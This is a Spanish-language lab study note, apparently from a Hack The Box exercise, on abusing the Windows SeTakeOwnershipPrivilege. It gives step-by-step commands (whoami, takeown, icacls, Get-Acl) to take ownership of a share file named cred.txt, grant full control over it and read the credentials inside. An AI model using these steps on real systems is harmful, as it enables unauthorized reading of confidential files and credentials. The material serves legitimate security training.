

Le da al usuario la capacidad de tomar posesion de cualquier objeto asegurable (secure object), los objetos de AD, archivos/carpetas NTFS, impresoras... Con este priv se asigan el derecho WRITE_OWNER sobre un objeto lo que significa que el usuario puede cambiar el propietario dentro del descriptor de seguridad del objeto

Se asigna a los administradores por defecto 

Podemos encontrarnos en un caso donde podemos asignar este privilegio a un usuario que controlemos para leer archivos y directorios confidenciales:

## Aprovechando el privilegio

#### Revisnado los privilegios del usuario

```
whoami /priv
```
![[Pasted image 20260818151804.png]]

#### Habilitando SeTakeOwnershipPrivilege

Vemos que no esta habilitado pero podemos usar este [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

![[Pasted image 20260818151906.png]]

#### Eligiendo un archivo objetivo

En este caso nos centraremos un recurso compartido de archivos. Estos suelen tener una parte publica y otra privada. En la parte publica no encontramos nada. Cuando vamos a la parte privada vemos que podemos listar (esta habilitado para todos los usuarios del dominio) pero no podemos leer

Bajo el directorio de IT vimos un archivo llamado cred.txt

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.Fullname).Owner}}
```
![[Pasted image 20260818152431.png]]

#### Comprobando la propiedad del archivo

```
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
![[Pasted image 20260818152510.png]]

Vemos que el directorio IT es propiedad de la cuenta de servicio "sccm_svc"


#### Tomando posesion del archiv

[takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown): para cambiar la propiedad del archivo

```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
![[Pasted image 20260818152653.png]]


#### Confirmando el cambio de propiedad

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
![[Pasted image 20260818152735.png]]

#### Modificando la ACL del archivo

```
cat 'C:\Department Shares\Private\IT\cred.txt'
```
![[Pasted image 20260818152806.png]]

Otorgamos a nuestro usuario privilegios completos sobre el archivo:

```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
![[Pasted image 20260818152841.png]]


#### Leyendo el archivo

```
cat 'C:\Department Shares\Private\IT\cred.txt'
```
![[Pasted image 20260818152907.png]]
